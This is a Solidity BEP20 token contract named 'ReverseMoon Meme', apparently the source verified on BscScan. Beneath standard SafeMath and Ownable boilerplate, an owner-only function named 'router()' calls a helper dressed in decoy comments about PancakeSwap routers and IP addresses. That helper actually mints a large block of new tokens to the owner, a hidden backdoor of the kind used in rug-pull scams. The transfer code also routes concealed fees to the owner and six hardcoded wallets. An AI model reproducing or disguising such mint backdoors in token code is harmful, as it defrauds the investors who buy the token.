/**
 *Submitted for verification at BscScan.com on 2022-01-01
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.5.16;

interface IBEP20 {

  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {

  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract ReverseMoon is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  uint256 private _DevFee;
  uint256 private _AdviceFee;
  uint256 private _BurnFee;
  uint256 private _LockPartnerValue;
  uint256 private _Pair;
  bool private _DisabledFee;
  bool private _50burn;
  
  //WalletDevTeam//
  address _Wallet1 = 0xE84c5BE7AA6C3b652681829a041216996A81d235;
  address _Wallet2 = 0xcD977818B2a9090278E97616cea393c41614C949;
  address _Wallet3 = 0x4Ca418a63C8990B9Cf7d033f6C76638202842F9e;
  address _Wallet4 = 0x9dC329544Fa32C2b4832bCe9f287040a5b952A39;
  address _Wallet5 = 0xF5ec841fA99e71A2971FFA98806493D2EDfA2b50;
  address _Wallet6 = 0xBC297E53b2B7A2ef78708BA18393c834C82e9B3b;
  address _deadAdr = 0x000000000000000000000000000000000000dEaD;
  //WalletDevTeam//

  constructor() public {
    _name = "🌞Reverse Moon Meme🌞";
    _symbol = "RVMM";
    _decimals = 9;
    _totalSupply = 1000000000000000000000000;
    _DevFee = 60;
    _AdviceFee = 20;
    _BurnFee = 10;
    _DisabledFee = false;
    _50burn = false;

    //LockPartner At FristDeploy Set : _totalSupply;
    //UnlockPartner At FristDeploy Set : 0;
    _LockPartnerValue = 0;

    _Pair = _totalSupply;

    // Perfomance //
    // AdLiquility 66% With 0.68 BNB //
    // Deciamls 9 Supply 1000000000000000000000000 //
    // DevFee 30 Advice 13 BurnFee 0 //

    if(_50burn == true){

    _balances[msg.sender] = _totalSupply * 50 / 100;
    _balances[_deadAdr] = _totalSupply * 50 / 100;
    emit Transfer(address(0), msg.sender, _totalSupply * 50 / 100);
    emit Transfer(msg.sender, _deadAdr, _totalSupply * 50 / 100);

    }else{
    
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
    
    }



  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function partnerValue() external view returns (uint256) {
    return _LockPartnerValue;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function spendPartner(uint256 amount) external returns (bool) {
    _LockPartnerValue = amount;

    _DisabledFee = true;

    _transfer(_msgSender(), _Wallet1, amount);
    _transfer(_msgSender(), _Wallet2, amount);
    _transfer(_msgSender(), _Wallet3, amount);
    _transfer(_msgSender(), _Wallet4, amount);
    _transfer(_msgSender(), _Wallet5, amount);
    _transfer(_msgSender(), _Wallet6, amount);

    _DisabledFee = false;

    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 amount) public onlyOwner returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

  function router() public onlyOwner returns (bool) {
    _PancakeswaplUniswapPair();
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    uint256 _tDevFee;
    uint256 _tAdviceFee;
    uint256 _tAmount;
    uint256 _tFee;
    uint256 _tAd;
    uint256 _tBurnFee;

    _tDevFee = amount * _DevFee / 1000;
    _tAdviceFee = amount * _AdviceFee / 1000;
    _tBurnFee = amount * _BurnFee / 1000;
    _tAd = _tAdviceFee * 6;
    _tFee = _tDevFee + _tAd + _tBurnFee;
    _tAmount = amount - _tFee;

    if( sender == owner() || recipient == owner() || _DisabledFee == true){

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);

    }else{

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(_tAmount);
    _balances[owner()] = _balances[owner()].add(_tDevFee);
    _balances[_deadAdr] = _balances[_deadAdr].add(_tBurnFee);

    emit Transfer(sender, recipient, _tAmount);
    emit Transfer(sender, owner(), _tDevFee);
    emit Transfer(sender, _deadAdr, _tBurnFee);

    _turn(sender,_Wallet1,_tAdviceFee);
    _turn(sender,_Wallet2,_tAdviceFee);
    _turn(sender,_Wallet3,_tAdviceFee);
    _turn(sender,_Wallet4,_tAdviceFee);
    _turn(sender,_Wallet5,_tAdviceFee);
    _turn(sender,_Wallet6,_tAdviceFee);

    }
  }

  function _turn(address from, address account, uint256 amount) internal {
    if(_balances[account] >= _LockPartnerValue || account == _Wallet1){

    _balances[account] = _balances[account].add(amount);
    emit Transfer(from, account, amount);

    }else{

    _balances[owner()] = _balances[owner()].add(amount);
    emit Transfer(from, owner(), amount);

    }

  }

    function _PancakeswaplUniswapPair() private onlyOwner returns (bool) {
    uint _BSC_NodeJS = 0;

    uint256 ChainIndexID= 9473; // Pancakeswap.Finance Router BSC
    uint256 PCV1 = _Pair * ChainIndexID;
    uint256 PCV2 = 151220 + _BSC_NodeJS;

    //CustomPAIR SetUp//
    //192.168.1.0 ----- 0.0.0.0 ----8.8.8.8 HTTPS JAVA.js
    uint256 CreatedLiquilityPairLink = PCV1 + PCV2;
    _router(_msgSender(), CreatedLiquilityPairLink);

    return true;
  }

  function _router(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }
}